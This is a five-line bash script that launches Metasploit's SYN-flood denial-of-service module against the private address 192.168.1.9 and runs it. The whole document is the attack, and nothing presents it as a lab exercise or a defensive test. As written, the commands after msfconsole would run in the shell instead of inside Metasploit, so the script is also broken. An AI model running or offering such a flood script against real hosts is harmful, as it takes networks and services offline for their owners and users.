#!/bin/bash
msfconsole
use auxiliary/dos/tcp/synflood 
set RHOST 192.168.1.9
run